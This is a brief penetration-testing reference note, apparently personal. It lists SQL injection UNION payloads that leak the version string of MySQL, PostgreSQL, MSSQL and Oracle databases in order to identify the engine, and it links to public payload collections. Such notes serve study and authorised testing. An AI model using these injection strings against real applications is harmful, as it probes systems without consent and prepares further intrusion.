# identify-sql-engine

**Author:** Julien Bongars\
**Date:** 2025-09-20 17:16:00
**Path:**

---

Version leak via UNION to tell MySQL, Postgres, MSSQL, or Oracle apart.

## MySQL

```sql
' UNION SELECT @@version--
' UNION SELECT version()--
```

## PostgreSQL

```sql
' UNION SELECT version()--
```

## MSSQL

```sql
' UNION SELECT @@version--
```

## Oracle

```sql
' UNION SELECT banner FROM v$version--
```

## Resources

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) — engine fingerprints
- [HackTricks — SQLi](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — DBMS detection
